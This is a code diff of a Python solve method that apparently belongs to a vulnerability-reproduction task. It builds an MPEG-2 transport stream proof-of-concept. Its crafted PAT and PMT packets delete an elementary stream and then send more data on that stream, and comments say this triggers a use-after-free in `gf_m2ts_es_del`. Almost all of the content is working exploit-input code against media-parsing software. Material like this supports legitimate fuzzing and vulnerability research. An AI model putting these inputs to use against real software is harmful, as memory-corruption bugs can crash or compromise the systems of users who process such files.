@@ -2,114 +2,90 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def mpeg_crc32(data):
+        # Helper to calculate MPEG-2 CRC32
+        def mpeg2_crc(data):
             crc = 0xFFFFFFFF
             for byte in data:
-                for i in range(7, -1, -1):
-                    bit = (byte >> i) & 1
-                    carry = (crc >> 31) & 1
-                    crc = (crc << 1) & 0xFFFFFFFF
-                    if carry ^ bit:
-                        crc ^= 0x04C11DB7
+                crc ^= (byte << 24)
+                for _ in range(8):
+                    if crc & 0x80000000:
+                        crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
+                    else:
+                        crc = (crc << 1) & 0xFFFFFFFF
             return crc
 
-        def make_packet(pid, payload, cc, pusi=False):
-            # Header: Sync(8) | TEI(1) PUSI(1) PRIO(1) PID(13) | SCR(2) AFC(2) CC(4)
-            # Sync: 0x47
-            header_val = 0x47000000
-            
+        # Helper to build a 188-byte TS packet
+        def make_packet(pid, payload, counter, pusi=False):
+            # Sync byte (0x47)
+            header = 0x47000000
+            # PUSI flag
             if pusi:
-                header_val |= 0x400000
+                header |= 0x400000
+            # PID (13 bits)
+            header |= (pid & 0x1FFF) << 8
+            # Adaptation Control (01 = payload only) + Continuity Counter (4 bits)
+            header |= 0x10 | (counter & 0x0F)
             
-            header_val |= (pid & 0x1FFF) << 8
+            pkt = bytearray(struct.pack('>I', header))
+            pkt.extend(payload)
             
-            # Adaptation 01 (Payload only) = 0x10. 
-            header_val |= 0x10 
-            
-            header_val |= (cc & 0x0F)
-            
-            pkt_header = struct.pack('>I', header_val)
-            
-            content = payload
-            if len(content) < 184:
-                content += b'\xff' * (184 - len(content))
-            
-            return pkt_header + content[:184]
+            # Padding with 0xFF to reach 188 bytes
+            pad = 188 - len(pkt)
+            if pad > 0:
+                pkt.extend(b'\xff' * pad)
+            return bytes(pkt)
 
-        packets = []
-        
-        # Constants
-        PAT_PID = 0
-        PMT_PID = 0x100
-        ES_PID = 0x200
-        
-        # --- Packet 1: PAT ---
-        # Defines Program 1 at PID 0x100
-        pat_section = bytearray()
-        pat_section.append(0x00) # Table ID (PAT)
-        pat_section.extend(b'\xB0\x0D') # Section Length
-        pat_section.extend(b'\x00\x01') # TS ID
-        pat_section.append(0xC1) # Ver 0, Cur
-        pat_section.append(0x00) 
-        pat_section.append(0x00)
-        
-        pat_section.extend(b'\x00\x01') # Prog 1
-        pat_section.extend(struct.pack('>H', 0xE000 | PMT_PID)) # PID 0x100
-        
-        crc = mpeg_crc32(pat_section)
-        pat_section.extend(struct.pack('>I', crc))
-        
-        # Add pointer field 0 for PUSI
-        packets.append(make_packet(PAT_PID, b'\x00' + pat_section, 0, pusi=True))
-        
-        # --- Packet 2: PMT (Ver 0) ---
-        # Defines ES at PID 0x200
-        pmt_section = bytearray()
-        pmt_section.append(0x02) # Table ID
-        pmt_section.extend(b'\xB0\x12') # Length
-        pmt_section.extend(b'\x00\x01') # Prog 1
-        pmt_section.append(0xC1) # Ver 0
-        pmt_section.append(0x00)
-        pmt_section.append(0x00)
-        pmt_section.extend(b'\xFF\xFF') # PCR PID
-        pmt_section.extend(b'\xF0\x00') # Prog Info
-        
-        pmt_section.append(0x06) # Type PES (Private)
-        pmt_section.extend(struct.pack('>H', 0xE000 | ES_PID))
-        pmt_section.extend(b'\xF0\x00')
-        
-        crc = mpeg_crc32(pmt_section)
-        pmt_section.extend(struct.pack('>I', crc))
-        
-        packets.append(make_packet(PMT_PID, b'\x00' + pmt_section, 0, pusi=True))
-        
-        # --- Packet 3: Data (ES_PID) ---
-        # Start PES - sets up state
-        pes_data = b'\x00\x00\x01\xE0\x00\x00' + b'\xAA'*100
-        packets.append(make_packet(ES_PID, pes_data, 0, pusi=True))
-        
-        # --- Packet 4: PMT (Ver 1) - Delete ES ---
-        pmt2_section = bytearray()
-        pmt2_section.append(0x02)
-        pmt2_section.extend(b'\xB0\x0D') # Length
-        pmt2_section.extend(b'\x00\x01')
-        pmt2_section.append(0xC3) # Ver 1 (11 000 0 1 1) -> C3
-        pmt2_section.append(0x00)
-        pmt2_section.append(0x00)
-        pmt2_section.extend(b'\xFF\xFF')
-        pmt2_section.extend(b'\xF0\x00')
-        # No streams
-        
-        crc = mpeg_crc32(pmt2_section)
-        pmt2_section.extend(struct.pack('>I', crc))
-        
-        packets.append(make_packet(PMT_PID, b'\x00' + pmt2_section, 1, pusi=True))
-        
-        # --- Packet 5: Data (ES_PID) - Continuation ---
-        # Access UAF?
-        packets.append(make_packet(ES_PID, b'\xBB'*184, 1, pusi=False))
-        
-        # --- Packet 6: Data (ES_PID) - More ---
-        packets.append(make_packet(ES_PID, b'\xCC'*184, 2, pusi=False))
-        
-        return b''.join(packets)
+        # PoC Construction:
+        # Sequence:
+        # 1. PAT: Maps Program 1 to PMT PID 0x100.
+        # 2. PMT (Ver 0): Defines ES (StreamType 0x11) at PID 0x101.
+        # 3. Data (PID 0x101): Valid payload to allocate ES resources.
+        # 4. Data (PID 0x101): Continuation.
+        # 5. PMT (Ver 1): Updates Program 1, removing ES 0x101. This triggers gf_m2ts_es_del.
+        # 6. Data (PID 0x101): Arrives after deletion. If cleanup is flawed, triggers Use-After-Free.
+
+        # Packet 1: PAT
+        # ID 0x00, Len 13 (0x0D), TSID 1, Ver 0, Sec 0/0, Prog 1 -> PID 0x100
+        pat_data = bytearray([
+            0x00, 0xB0, 0x0D, 0x00, 0x01, 0xC1, 0x00, 0x00, 
+            0x00, 0x01, 0xE1, 0x00
+        ])
+        pat_crc = mpeg2_crc(pat_data)
+        pat_data.extend(struct.pack('>I', pat_crc))
+        # PUSI=1, so payload starts with pointer field 0x00
+        pkt1 = make_packet(0, b'\x00' + pat_data, 0, True)
+
+        # Packet 2: PMT Version 0 (PID 0x100)
+        # ID 0x02, Len 18 (0x12), Prog 1, Ver 0, PCR 0x101, InfoLen 0
+        # Stream: Type 0x11 (MPEG-4 Systems), PID 0x101, InfoLen 0
+        pmt0_data = bytearray([
+            0x02, 0xB0, 0x12, 0x00, 0x01, 0xC1, 0x00, 0x00, 
+            0xF1, 0x01, 0xF0, 0x00, 
+            0x11, 0xE1, 0x01, 0xF0, 0x00
+        ])
+        pmt0_crc = mpeg2_crc(pmt0_data)
+        pmt0_data.extend(struct.pack('>I', pmt0_crc))
+        pkt2 = make_packet(0x100, b'\x00' + pmt0_data, 0, True)
+
+        # Packet 3: ES Data (PID 0x101)
+        # PES Header: 00 00 01 E0 (Video) ...
+        data3 = b'\x00\x00\x01\xE0\x00\x00' + b'\xAA' * 20
+        pkt3 = make_packet(0x101, data3, 0, True)
+
+        # Packet 4: ES Data Continuation (PID 0x101)
+        pkt4 = make_packet(0x101, b'\xBB' * 20, 1, False)
+
+        # Packet 5: PMT Version 1 (PID 0x100) - DELETE ES
+        # ID 0x02, Len 13 (0x0D), Prog 1, Ver 1 (0xC3), PCR 0x101, InfoLen 0, NO STREAMS
+        pmt1_data = bytearray([
+            0x02, 0xB0, 0x0D, 0x00, 0x01, 0xC3, 0x00, 0x00, 
+            0xF1, 0x01, 0xF0, 0x00
+        ])
+        pmt1_crc = mpeg2_crc(pmt1_data)
+        pmt1_data.extend(struct.pack('>I', pmt1_crc))
+        pkt5 = make_packet(0x100, b'\x00' + pmt1_data, 1, True)
+
+        # Packet 6: ES Data (PID 0x101) - Use After Free Trigger
+        pkt6 = make_packet(0x101, b'\xCC' * 20, 2, False)
+
+        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6
